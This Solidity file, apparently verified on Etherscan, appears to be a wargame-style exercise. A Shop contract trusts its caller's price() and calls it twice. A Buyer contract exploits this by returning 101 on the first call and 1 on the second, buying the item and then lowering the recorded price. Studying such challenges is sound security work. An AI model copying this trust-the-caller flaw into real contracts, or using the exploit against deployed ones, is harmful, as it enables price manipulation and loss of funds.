/**
 *Submitted for verification at Etherscan.io on 2022-06-08
*/

// SPDX-License-Identifier: Unlicense

pragma solidity >=0.8.0 <0.9.0;

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Buyer {
  bool public flag;

  function buyItem(Shop shop) external {
    shop.buy();
  }

  function price() external returns (uint) {
    if (!flag) {
      flag = !flag;
      return 101;
    }
    return 1;
  }

}